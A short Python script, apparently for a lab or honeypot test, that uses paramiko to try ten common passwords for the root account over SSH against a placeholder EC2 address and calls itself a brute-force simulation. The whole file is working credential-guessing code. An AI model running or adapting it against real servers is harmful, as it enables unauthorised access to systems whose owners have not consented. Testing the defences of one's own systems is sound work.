from paramiko import *
from time import *

target_ip = "<EC2_PUBLIC_IP>"
port = "2222"
username = "root"
passwords = ["123456", "admin", "password", "toor", "qwerty", "letmein", "malak", "qabas", "cloud", "2025"]
delay = 1 

print(f"[+] Starting brute-force simulation on {target_ip}...")

for password in passwords:
    print(f"[*] Trying password: {password}")
    ssh = SSHClient()

    try:
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        ssh.connect(target_ip, port=port, username=username, password=password, timeout=5)
    except AuthenticationException:
        print(f"[-] Failed login with '{password}' (expected)")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        ssh.close()
        sleep(delay)

print("[+] Simulation complete!")
